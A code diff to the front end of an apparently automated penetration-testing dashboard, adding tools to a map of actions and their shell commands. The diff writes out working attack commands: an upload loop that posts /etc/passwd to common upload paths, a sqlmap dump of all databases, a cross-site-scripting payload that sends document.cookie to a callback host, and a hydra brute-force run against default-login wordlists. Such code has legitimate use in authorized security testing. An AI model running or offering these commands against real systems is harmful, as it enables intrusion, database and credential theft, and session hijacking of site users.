@@ -1020,11 +1020,13 @@ function DashboardView({ logs, findings, targets }) {
 // ─── PENTEST VIEW ───────────────────────────────────────────────────────────────
 
 const TOOL_BINS = {
-  subfinder: 'subfinder', httpx: 'httpx',    ghauri: 'ghauri',    ffuf: 'ffuf',
-  aquatone: 'aquatone',  burp_suite: 'bash', naabu_scan: 'nmap',  katana_crawl: 'curl',
-  nuclei_fast: 'nuclei', nuclei_exploit: 'nuclei', sqli_scan: 'sqlmap',xss_check: 'nuclei', cors_check: 'nuclei',
-  js_analyze: 'whatweb', dir_fuzz: 'gobuster',ssrf_check: 'nuclei',lfi_test: 'nuclei',
-  shell_upload: 'curl',  cred_dump: 'sqlmap', xss_inject: 'curl',
+  subfinder: 'subfinder', httpx: 'httpx',     ghauri: 'ghauri',      ffuf: 'ffuf',
+  aquatone: 'aquatone',   burp_suite: 'bash', naabu_scan: 'nmap',    katana_crawl: 'curl',
+  nuclei_fast: 'nuclei',  nuclei_exploit: 'nuclei', sqli_scan: 'sqlmap', xss_check: 'nuclei',
+  cors_check: 'nuclei',   js_analyze: 'whatweb',   dir_fuzz: 'gobuster', ssrf_check: 'nuclei',
+  lfi_test: 'nuclei',     shell_upload: 'curl',    cred_dump: 'sqlmap',  xss_inject: 'curl',
+  testssl: 'testssl.sh',  hydra: 'hydra',          ssti_check: 'nuclei', jwt_check: 'nuclei',
+  admin_takeover: 'nuclei',
 };
 
 function PentestView({ apiKey, mcpUrl, mcpTools }) {
@@ -1039,13 +1041,14 @@ function PentestView({ apiKey, mcpUrl, mcpTools }) {
     sqli_scan: false,  xss_check: false,   cors_check: false,
     js_analyze: false, dir_fuzz: false,    ssrf_check: false,  lfi_test: false,
     shell_upload: false, cred_dump: false,  xss_inject: false,
+    testssl: false, hydra: false, ssti_check: false, jwt_check: false, admin_takeover: false,
   });
   const [autoMode,   setAutoMode]   = useState(false);
   const [xssCallback,setXssCallback]= useState('');
   const PRIMARY   = ['subfinder','httpx','ghauri','ffuf','aquatone','burp_suite'];
-  const SECONDARY = ['naabu_scan','katana_crawl','nuclei_fast','nuclei_exploit','sqli_scan','xss_check','cors_check','js_analyze','dir_fuzz','ssrf_check','lfi_test'];
-  const EXPLOIT   = ['shell_upload','cred_dump','xss_inject'];
-  const AUTO_TOOLS = ['subfinder','httpx','naabu_scan','nuclei_fast','nuclei_exploit','ffuf','sqli_scan','xss_check','cors_check','ssrf_check','lfi_test','js_analyze','ghauri'];
+  const SECONDARY = ['naabu_scan','katana_crawl','nuclei_fast','nuclei_exploit','sqli_scan','xss_check','cors_check','js_analyze','dir_fuzz','ssrf_check','lfi_test','testssl','ssti_check','jwt_check','admin_takeover'];
+  const EXPLOIT   = ['shell_upload','cred_dump','xss_inject','hydra'];
+  const AUTO_TOOLS = ['subfinder','httpx','naabu_scan','nuclei_fast','nuclei_exploit','ffuf','sqli_scan','xss_check','cors_check','ssrf_check','lfi_test','js_analyze','ghauri','testssl','ssti_check','jwt_check','admin_takeover'];
   const logRef = useRef(null);
 
   useEffect(() => {
@@ -1088,9 +1091,14 @@ function PentestView({ apiKey, mcpUrl, mcpTools }) {
     dir_fuzz:     { tool: 'gobuster',  args: (t) => ({ target: t }) },
     ssrf_check:   { tool: 'nuclei',    args: (t) => ({ target: t, templates: 'ssrf', severity: 'critical,high' }) },
     lfi_test:     { tool: 'nuclei',    args: (t) => ({ target: t, templates: 'lfi', severity: 'critical,high,medium' }) },
-    shell_upload: { tool: 'shell',     args: (t) => ({ command: `for p in /upload /admin/upload /wp-content/uploads /files /images /uploads; do r=$(curl -s -o /dev/null -w '%{http_code}' -X POST "${t}$p" -F 'file=@/etc/passwd' 2>/dev/null); [ "$r" = "200" ] || [ "$r" = "201" ] && echo "UPLOAD_OK:${t}$p [$r]"; done` }) },
-    cred_dump:    { tool: 'sqlmap',    args: (t) => ({ url: t, flags: '--batch --dump-all --level=3 --risk=3 --threads=5' }) },
-    xss_inject:   { tool: 'shell',     args: (t, cb) => ({ command: `curl -s -G "${t}" --data-urlencode "q=<script>fetch('${cb||'http://CALLBACK'}?c='+btoa(document.cookie))</script>" -A 'Mozilla/5.0' -o /dev/null -w '%{http_code}'` }) },
+    shell_upload:   { tool: 'shell',   args: (t) => ({ command: `for p in /upload /admin/upload /wp-content/uploads /files /images /uploads; do r=$(curl -s -o /dev/null -w '%{http_code}' -X POST "${t}$p" -F 'file=@/etc/passwd' 2>/dev/null); [ "$r" = "200" ] || [ "$r" = "201" ] && echo "UPLOAD_OK:${t}$p [$r]"; done` }) },
+    cred_dump:      { tool: 'sqlmap',  args: (t) => ({ url: t, flags: '--batch --dump-all --level=3 --risk=3 --threads=5' }) },
+    xss_inject:     { tool: 'shell',   args: (t, cb) => ({ command: `curl -s -G "${t}" --data-urlencode "q=<script>fetch('${cb||'http://CALLBACK'}?c='+btoa(document.cookie))</script>" -A 'Mozilla/5.0' -o /dev/null -w '%{http_code}'` }) },
+    testssl:        { tool: 'shell',   args: (t) => ({ command: `testssl.sh --quiet --color 0 ${t.replace(/https?:\/\//, '')} 2>/dev/null | head -80` }) },
+    hydra:          { tool: 'shell',   args: (t) => ({ command: `hydra -L /usr/share/wordlists/metasploit/http_default_users.txt -P /usr/share/wordlists/metasploit/http_default_pass.txt ${t.replace(/https?:\/\//, '').split('/')[0]} http-get / -t 4 -f 2>/dev/null | head -30` }) },
+    ssti_check:     { tool: 'nuclei',  args: (t) => ({ target: t, templates: 'ssti,injection', severity: 'critical,high,medium' }) },
+    jwt_check:      { tool: 'nuclei',  args: (t) => ({ target: t, templates: 'token,exposures', severity: 'critical,high,medium' }) },
+    admin_takeover: { tool: 'nuclei',  args: (t) => ({ target: t, templates: 'takeovers,default-logins,exposed-panels', severity: 'critical,high,medium,low' }) },
   };
 
   const runToolParallel = async (selected, tgt) => {
